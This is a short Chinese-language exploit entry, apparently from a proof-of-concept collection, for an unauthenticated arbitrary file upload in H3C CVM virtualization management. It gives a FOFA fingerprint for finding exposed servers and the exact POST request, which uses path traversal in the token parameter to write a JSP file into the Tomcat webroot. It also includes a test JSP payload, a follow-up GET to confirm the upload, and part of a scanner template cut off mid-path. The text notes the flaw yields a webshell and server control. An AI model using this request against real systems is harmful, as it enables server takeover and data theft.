# H3CCVMupload前台任意文件上传漏洞

- **系统**：H3CCVMupload　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`server="H3C-CVM"`
- **请求**：`POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/a.jsp&name=123 HTTP/1.1`
- **关键头**：`Host: your-ip`　`Content-Range: bytes 0-10/20`　`id: h3c-cvm-anyfile-upload`　`name: H3C CVM 前台任意文件上传漏洞`　`author: daffainfo`　`severity: critical`　`verified: false`

**请求体 / payload**
```
<%out.println("test");%>
上传定位：GET //cas/js/lib/buttons/a.jsp HTTP/1.1
H3C公司依托其强大的技术实力、产品与服务优势，以及深入人心的以客户为中心的理念，为企业数据中心IaaS云计算基础架构提供最优化的虚拟化与云业务运营解决方案。通过H3CCASCVM虚拟化管理系统实现数据中心虚拟化环境的中央管理控制，以简洁的管理界面，统一管理数据中心内所有的物理资源和虚拟资源，不仅能提高管理员的管控能力、简化日常例行工作，更可降低IT环境的复杂度和管理成本。H3CCVM存在任意文件上传漏洞，攻击者可以上传任意文件，获取webshell，控制服务器权限，读取敏感信息等。
fofa-query: server="H3C-CVM"
reference:
- [https://wx.zsxq.com/group/88885811181452](https://wx.zsxq.com/group/88885811181452)
set:
hosturl: request.url
r1: randomLowercase(20)
rules:
r0:
request:
method: POST
path:  /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps…（脚本共 965 字，完整版见原文）
```
- **预期**：200　|　—